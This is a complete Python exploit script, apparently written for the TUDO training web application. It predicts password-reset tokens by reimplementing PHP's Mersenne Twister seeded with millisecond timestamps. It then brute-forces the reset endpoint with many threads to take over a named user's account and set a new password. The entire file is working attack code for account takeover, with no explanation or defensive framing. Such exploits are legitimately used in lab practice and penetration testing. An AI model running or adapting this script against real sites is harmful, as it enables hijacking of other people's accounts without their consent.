#!/usr/bin/env python3
# TUDO weak-reset-token takeover. Pure stdlib (no requests, no php).
# Tokens are reproduced in-process with a PHP-8.x-compatible Mersenne Twister,
# validated against the server. Window is anchored to the server clock so the
# client's clock (WSL2 drift etc.) can't push the seed out of range.
import sys, time, threading, urllib.request, urllib.parse
from email.utils import parsedate_to_datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

SENT_MARKER, SUCCESS_MARKER = "Email sent!", "Password changed!"
WORKERS = 40
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
_N, _M, _A, _U, _L = 624, 397, 0x9908b0df, 0x80000000, 0x7fffffff

def php_token(seed):
    s = [0]*_N
    s[0] = seed & 0xffffffff
    for i in range(1, _N):
        s[i] = (1812433253*(s[i-1] ^ (s[i-1] >> 30)) + i) & 0xffffffff
    for i in range(_N-_M):
        s[i] = (s[i+_M] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
    for i in range(_N-_M, _N-1):
        s[i] = (s[i+_M-_N] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
    s[_N-1] = (s[_M-1] ^ (((s[_N-1]&_U)|(s[0]&_L))>>1) ^ ((0xffffffff*(s[0]&1))&_A)) & 0xffffffff
    out = []
    for k in range(32):
        y = s[k]
        y ^= y >> 11
        y ^= (y << 7) & 0x9d2c5680
        y ^= (y << 15) & 0xefc60000
        y ^= y >> 18
        out.append(CHARS[(y & 0xffffffff) % 63])
    return ''.join(out)

def post(url, data, timeout=25):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="ignore"), r.headers

def main():
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target_url> <target_user> <new_password>")
        sys.exit(1)
    target, user, newpass = sys.argv[1].rstrip("/"), sys.argv[2], sys.argv[3]

    ts_lo = int(time.time()*1000)
    html, hdrs = post(f"{target}/forgotpassword.php", {"username": user})
    ts_hi = int(time.time()*1000)
    if SENT_MARKER not in html:
        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin excluded).")
        sys.exit(1)

    # server clock from the Date header (1s resolution) -> skew-proof anchor
    srv_ms = int(parsedate_to_datetime(hdrs["Date"]).timestamp()*1000)

    # candidate seeds, ordered fast-path first:
    #   1) client window, reversed (instant hit when clocks agree)
    #   2) server-Date window (catches clock skew), minus overlap
    client = list(range(ts_lo, ts_hi+1))[::-1]
    seen = set(client)
    date = [s for s in range(srv_ms-300, srv_ms+1300) if s not in seen]
    seeds = client + date
    print(f"[*] Reset for {user} | client window {ts_hi-ts_lo}ms | server-anchored +{len(date)} | {len(seeds)} candidates")

    tokens = [php_token(s) for s in seeds]

    found = threading.Event(); state = {"tok": None, "done": 0}; lock = threading.Lock()
    def try_token(tok):
        if found.is_set(): return
        try:
            html, _ = post(f"{target}/resetpassword.php",
                           {"token": tok, "password1": newpass, "password2": newpass})
        except Exception:
            return
        with lock:
            state["done"] += 1
            if SUCCESS_MARKER in html and not found.is_set():
                state["tok"] = tok; found.set()
            if state["done"] % 25 == 0 and not found.is_set():
                sys.stdout.write(f"\r[*] tried {state['done']}/{len(tokens)}   ")
                sys.stdout.flush()

    start = time.time()
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = [ex.submit(try_token, t) for t in tokens]
        for _ in as_completed(futs):
            if found.is_set():
                break
        ex.shutdown(wait=False, cancel_futures=True)
    el = time.time() - start
    print()
    if found.is_set():
        print(f"[+] SUCCESS in {el:.1f}s -- {user}'s password is now '{newpass}'")
        print(f"[+] Winning token: {state['tok']}")
    else:
        print(f"[-] FAILED in {el:.1f}s -- token not in window. Widen the date range or raise WORKERS.")

if __name__ == "__main__":
    main()
